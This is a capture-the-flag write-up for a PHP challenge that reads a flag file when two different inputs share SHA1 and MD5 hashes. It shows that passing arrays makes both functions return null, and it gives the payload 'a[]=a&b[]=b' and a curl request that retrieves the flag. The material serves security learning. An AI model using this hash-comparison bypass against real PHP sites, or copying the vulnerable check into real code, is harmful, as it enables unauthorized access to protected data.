# Tricks 1

*A couple of PHP Tricks, give it a try.*

---

```php
 <?php
    error_reporting(0);

    if (isset($_GET["a"]) && isset($_GET["b"])) {
        if ($_GET["a"] !== $_GET["b"] && sha1($_GET["a"]) === sha1($_GET["b"])) {
            if ($_GET["a"] !== $_GET["b"] && md5($_GET["a"]) === md5($_GET["b"])) {
                $flag = file_get_contents("../../flag");
                echo $flag;
            }else {
                echo "Didn't get passed MD5.";
            }
        }else {
            echo "Didn't get passed SHA1.";
        }
    }else {
        highlight_file(__FILE__);
        die();
    }
?> 
```

`md5`和`sha1	`不能用来处理数组,`md5(arr)`和`sha1(arr)`会返回null

**payload**: `a[]=a&b[]=b`

```shell
~$ curl "https://ch5.sbug.se/?a[]=a&b[]=b"
SBCTF{g07_2_w17h_0n3_SH07?}
```

**flag:**`SBCTF{g07_2_w17h_0n3_SH07?}`

